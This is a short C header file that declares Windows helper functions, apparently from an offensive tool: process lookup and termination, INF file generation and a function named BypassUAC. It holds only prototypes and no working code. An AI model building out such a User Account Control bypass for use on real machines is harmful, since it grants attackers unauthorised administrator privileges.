#pragma once
#include "psychosomatic.h"

DWORD GetPid(LPCWSTR processName);
BOOL TerminateProcessByName(LPCWSTR lpProcessName);
LPSTR FormatArg(LPSTR* lpArgs, INT iArgc);
PBYTE GenerateInfFile(LPCSTR lpServiceName, LPCSTR lpFileName);
void BypassUAC(INT argc, LPSTR* args);
DWORD GetRandomProcess(void);